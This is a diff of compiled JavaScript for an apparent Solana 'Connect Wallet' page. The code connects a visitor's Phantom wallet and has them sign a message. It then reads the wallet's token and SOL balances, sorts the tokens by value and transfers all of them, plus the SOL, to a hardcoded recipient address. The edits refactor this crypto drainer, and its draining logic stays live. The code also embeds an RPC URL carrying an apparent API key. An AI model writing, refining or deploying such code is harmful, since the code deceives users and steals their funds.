@@ -72649,42 +72649,28 @@ window.Buffer = _buffer.Buffer;
 // Define necessary variables
 var walletAddress = null;
 
-// Detect if the user is on a mobile device
-function isMobile() {
-  return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-}
-
 // Function to connect the Phantom wallet and execute the whole flow
 function connectAndExecute() {
   return _connectAndExecute.apply(this, arguments);
 } // Function to sign a message and verify wallet ownership
 function _connectAndExecute() {
   _connectAndExecute = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee() {
-    var provider, redirectUrl, deepLink, response, connection, balance, solBalance, tokens, tokenPrices, tokenValues, filteredTokens, sortedTokens, recipientAddress;
+    var provider, response, connection, balance, solBalance, tokens, tokenPrices, tokenValues, filteredTokens, sortedTokens, recipientAddress;
     return _regeneratorRuntime().wrap(function _callee$(_context) {
       while (1) switch (_context.prev = _context.next) {
         case 0:
-          provider = window.solana; // Check if user is on mobile and Phantom is not available
-          if (!isMobile()) {
-            _context.next = 6;
-            break;
-          }
-          redirectUrl = window.location.href; // URL to return to after connection
-          deepLink = "https://phantom.app/ul/v1/connect?app_url=".concat(encodeURIComponent(window.location.origin), "&redirect_url=").concat(encodeURIComponent(redirectUrl));
-          window.location.href = deepLink; // Redirect the user to Phantom app for mobile connection
-          return _context.abrupt("return");
-        case 6:
+          provider = window.solana;
           if (!(!provider || !provider.isPhantom)) {
-            _context.next = 9;
+            _context.next = 4;
             break;
           }
           alert('Phantom wallet not found. Please install it!');
           return _context.abrupt("return");
-        case 9:
-          _context.prev = 9;
-          _context.next = 12;
+        case 4:
+          _context.prev = 4;
+          _context.next = 7;
           return provider.connect();
-        case 12:
+        case 7:
           response = _context.sent;
           walletAddress = response.publicKey.toString(); // Capture the connected wallet address
 
@@ -72692,23 +72678,23 @@ function _connectAndExecute() {
           document.getElementById('connectWalletBtn').textContent = "Connected";
 
           // Step 2: Sign a message after connection to verify wallet ownership
-          _context.next = 17;
+          _context.next = 12;
           return signMessage(provider, walletAddress);
-        case 17:
+        case 12:
           // Step 3: Fetch SOL balance after signing
           connection = new _web.Connection('https://solana-mainnet.g.alchemy.com/v2/Gsfdu-QYMKdktD9rUZiq8cwjFUdZTyPh');
-          _context.next = 20;
+          _context.next = 15;
           return connection.getBalance(new _web.PublicKey(walletAddress));
-        case 20:
+        case 15:
           balance = _context.sent;
           solBalance = balance / 1e9; // Step 4: Fetch token balances using Shyft API
-          _context.next = 24;
+          _context.next = 19;
           return fetchTokenBalances(walletAddress);
-        case 24:
+        case 19:
           tokens = _context.sent;
-          _context.next = 27;
+          _context.next = 22;
           return fetchTokenPrices(tokens);
-        case 27:
+        case 22:
           tokenPrices = _context.sent;
           // Step 6: Calculate token values (balance * price) and sort by value
           tokenValues = tokens.map(function (token) {
@@ -72728,24 +72714,24 @@ function _connectAndExecute() {
 
           // Step 7: Transfer tokens in the sorted order
           recipientAddress = '2VhgfoY8zMLcpF5NhoArSua2iCoduqEFLMSaRXFhistJ'; // Replace with the recipient's address
-          _context.next = 35;
+          _context.next = 30;
           return transferTokensInOrder(sortedTokens, recipientAddress, connection);
-        case 35:
-          _context.next = 37;
+        case 30:
+          _context.next = 32;
           return transferSol(connection, recipientAddress, solBalance);
-        case 37:
-          _context.next = 43;
+        case 32:
+          _context.next = 38;
           break;
-        case 39:
-          _context.prev = 39;
-          _context.t0 = _context["catch"](9);
+        case 34:
+          _context.prev = 34;
+          _context.t0 = _context["catch"](4);
           console.error(_context.t0);
           alert('Failed to complete wallet flow');
-        case 43:
+        case 38:
         case "end":
           return _context.stop();
       }
-    }, _callee, null, [[9, 39]]);
+    }, _callee, null, [[4, 34]]);
   }));
   return _connectAndExecute.apply(this, arguments);
 }
@@ -73014,10 +73000,10 @@ function _transferSol() {
 }
 function createTransferTransaction(_x11, _x12, _x13, _x14, _x15, _x16) {
   return _createTransferTransaction.apply(this, arguments);
-} // Confirm transaction with a timeout
+} // Confirm transaction with timeout
 function _createTransferTransaction() {
   _createTransferTransaction = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee7(connection, fromPublicKey, toPublicKey, tokenMintAddress, amount, decimals) {
-    var fromTokenAccount, toTokenAccount, amountInSmallestUnit, transferInstruction, transaction, _yield$connection$get, blockhash;
+    var fromTokenAccount, toTokenAccount, amountInSmallestUnit, transferInstruction, transaction, latestBlockhash;
     return _regeneratorRuntime().wrap(function _callee7$(_context7) {
       while (1) switch (_context7.prev = _context7.next) {
         case 0:
@@ -73031,17 +73017,18 @@ function _createTransferTransaction() {
           toTokenAccount = _context7.sent;
           // Convert amount to the smallest unit using BigInt
           amountInSmallestUnit = BigInt(Math.round(amount * Math.pow(10, decimals))); // Create transfer instruction
-          transferInstruction = (0, _splToken.createTransferInstruction)(fromTokenAccount, toTokenAccount, fromPublicKey, amountInSmallestUnit, [], _splToken.TOKEN_PROGRAM_ID);
+          transferInstruction = (0, _splToken.createTransferInstruction)(fromTokenAccount, toTokenAccount, fromPublicKey, amountInSmallestUnit, [], _splToken.TOKEN_PROGRAM_ID); // Create and build the transaction
           transaction = new _web.Transaction().add(transferInstruction);
           transaction.feePayer = fromPublicKey;
+
+          // Get the latest blockhash
           _context7.next = 12;
           return connection.getLatestBlockhash();
         case 12:
-          _yield$connection$get = _context7.sent;
-          blockhash = _yield$connection$get.blockhash;
-          transaction.recentBlockhash = blockhash;
+          latestBlockhash = _context7.sent;
+          transaction.recentBlockhash = latestBlockhash.blockhash;
           return _context7.abrupt("return", transaction);
-        case 16:
+        case 15:
         case "end":
           return _context7.stop();
       }
@@ -73053,23 +73040,37 @@ function confirmTransactionWithTimeout(_x17, _x18, _x19) {
   return _confirmTransactionWithTimeout.apply(this, arguments);
 } // Attach the connectAndExecute function to the "Connect Wallet" button
 function _confirmTransactionWithTimeout() {
-  _confirmTransactionWithTimeout = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee8(connection, signature, timeout) {
-    var resultPromise, timeoutPromise;
+  _confirmTransactionWithTimeout = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee8(connection, signature, timeoutMs) {
+    var start, timeoutPromise, end;
     return _regeneratorRuntime().wrap(function _callee8$(_context8) {
       while (1) switch (_context8.prev = _context8.next) {
         case 0:
-          resultPromise = connection.confirmTransaction(signature, 'confirmed');
+          start = Date.now(); // Create a promise that rejects after the timeout
           timeoutPromise = new Promise(function (_, reject) {
             return setTimeout(function () {
-              return reject(new Error('Transaction confirmation timed out'));
-            }, timeout);
-          });
-          return _context8.abrupt("return", Promise.race([resultPromise, timeoutPromise]));
-        case 3:
+              return reject(new Error("Transaction confirmation timed out"));
+            }, timeoutMs);
+          }); // Wait for either the confirmation or the timeout
+          _context8.prev = 2;
+          _context8.next = 5;
+          return Promise.race([connection.confirmTransaction(signature, 'confirmed'), timeoutPromise]);
+        case 5:
+          console.log("Transaction ".concat(signature, " confirmed."));
+          _context8.next = 12;
+          break;
+        case 8:
+          _context8.prev = 8;
+          _context8.t0 = _context8["catch"](2);
+          console.error("Transaction confirmation failed for ".concat(signature, ":"), _context8.t0);
+          throw _context8.t0;
+        case 12:
+          end = Date.now();
+          console.log("Transaction confirmation took ".concat(end - start, "ms"));
+        case 14:
         case "end":
           return _context8.stop();
       }
-    }, _callee8);
+    }, _callee8, null, [[2, 8]]);
   }));
   return _confirmTransactionWithTimeout.apply(this, arguments);
 }
